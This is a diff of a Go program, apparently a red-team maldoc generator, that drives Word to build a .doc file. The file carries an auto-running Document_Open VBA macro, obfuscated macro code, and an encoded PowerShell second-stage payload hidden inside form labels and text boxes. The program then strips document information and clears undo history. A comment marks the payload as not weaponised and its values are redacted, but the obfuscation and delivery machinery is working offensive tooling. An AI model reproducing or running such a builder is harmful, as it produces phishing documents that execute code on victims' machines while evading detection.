@@ -15,6 +15,7 @@ import (
 	"github.com/oxis/gomacro/resources"
 )
 
+// add a TextBox with custom properties
 func addTextBox(n int, name string, text string, newForm *gomacro.Form) int {
 
 	newForm.Add("forms.textbox.1", name)
@@ -28,6 +29,7 @@ func addTextBox(n int, name string, text string, newForm *gomacro.Form) int {
 	return n
 }
 
+// add a Label with custom properties
 func addLabel(n int, name string, text string, newForm *gomacro.Form) int {
 
 	newForm.Add("forms.label.1", name)
@@ -40,6 +42,8 @@ func addLabel(n int, name string, text string, newForm *gomacro.Form) int {
 	return n
 }
 
+// setupForm takes a map of maps, extracts TextBox, Label and PSPayload and create the differnt form items.
+// Also replaces references to those items inside the code
 func setupForm(strList map[string]map[int]string, nameMap map[string]string, newForm *gomacro.Form, code string) string {
 
 	for n, value := range strList["TextBox"] {
@@ -68,6 +72,8 @@ func setupForm(strList map[string]map[int]string, nameMap map[string]string, new
 	return code
 }
 
+// encode substract offset from char and add a separator between each char
+// ex: offset = 1, sep = 'x', HELLO -> GxDxKxKxN
 func encode(str string, offset string, sep string) string {
 
 	offset2, _ := strconv.Atoi(offset)
@@ -98,18 +104,23 @@ func newEncodedPSScript(script string) (string, error) {
 }
 
 func main() {
+	// Initialise the lib
 	gomacro.Init()
 	defer gomacro.Uninitialize()
 
+	// Open Word and get a hendle to documents
 	documents := gomacro.NewDocuments(false)
 	defer documents.Close()
 
 	fmt.Printf("Word version is %s\n", documents.Application.Version)
 
+	// Add a new document
 	document := documents.AddDocument()
 
+	// Set the name of the new doc
 	document.VBProject.SetName(obf.RandWord())
 
+	// Get a handle "ThisDocument" VBA project
 	thisDoc, err := document.VBProject.VBComponents.GetVBComponent("ThisDocument")
 	if err != nil {
 		fmt.Printf("%s", err)
@@ -117,49 +128,64 @@ func main() {
 		documents.Close()
 	}
 
+	// Rename it
 	thisDoc.SetName(obf.RandWord())
 
+	// Obfuscate VBA code found in "resources"
 	code, funcMap, paramMap, varMap, stringMap := obf.ObfuscateVBCode(resources.EntryPointFunction, true, true, true, true)
 	code2, funcMap2, paramMap2, varMap2, stringMap2 := obf.ObfuscateVBCode(resources.StringDecryptFunction, true, true, true, false)
 
+	// Replace all func, param, var and string to obfuscated version
 	code = obf.ReplaceAllInCode(fmt.Sprintf("%v\n%v", code, code2), funcMap, paramMap, varMap, stringMap)
 	code = obf.ReplaceAllInCode(code, funcMap2, paramMap2, varMap2, stringMap2)
 
+	// Document_Open() func is here
 	docOpen := fmt.Sprintf(resources.DocumentOpen, obf.RandWord())
 	docOpen = strings.ReplaceAll(docOpen, "EntryPoint", funcMap["EntryPoint"])
 
+	// Add it to the project
 	thisDoc.CodeModule.AddFromString(docOpen)
 
+	// Create a map to hold form name and obfuscated version
 	var nameMap map[string]string = make(map[string]string)
 
+	// "UserForm1" -> random
 	nameMap["UserForm1"] = obf.RandWord()
+	// Add a new form and set random caption
 	newForm := document.VBProject.VBComponents.AddNewForm(nameMap["UserForm1"])
 	newForm.SetProperty("Caption", obf.RandWord())
 
-	// Setup second stage
+	// Setup second stage, not weaponised
 	resources.Payload = fmt.Sprintf(resources.Payload, "[REDACTED]", "[REDACTED]")
-
 	b64Payload, _ := newEncodedPSScript(resources.Payload)
 	finalPayload := fmt.Sprintf(resources.PSPayload, b64Payload)
 
+	// this map contains TextBox, Label and the payload, each associated to an encoded string. strMap["Label"][0] refers to "Label0" inside the VBA project.
 	strMap := map[string]map[int]string{
 		"PSPayload": {0: encode(finalPayload, resources.Offset, resources.Sep)},
 		"Label": {1: resources.Offset, // Label1 is Offset
 			2: resources.Sep}, // Label2 is Sep
 	}
 
+	// Setup the form with Labels and TexBoxes
 	code = setupForm(strMap, nameMap, newForm, code)
 
+	// Add a new module with random name
 	newModule := document.VBProject.VBComponents.AddVBComponent(obf.RandWord(), gomacro.MODULE)
+	// code is obfuscated version of the code in "resources"
 	newModule.CodeModule.AddFromString(code)
 
+	// Some cleanup
 	document.Application.Options.SetOption("Pagination", false)
 	document.Repaginate()
 	document.Application.SetOption("ScreenUpdating", true)
 	document.Application.ScreenRefresh()
 
+	// Wipe doc infos
 	document.RemoveDocumentInformation(99)
+	// Can't go back
 	document.UndoClear()
-	document.SaveAs("C:\\Users\\test\\go\\src\\github.com\\oxis\\gomacro\\cmd\\main\\Test.doc")
+	// Save and close
+	document.SaveAs(".\\Test.doc")
 	documents.Save()
 }
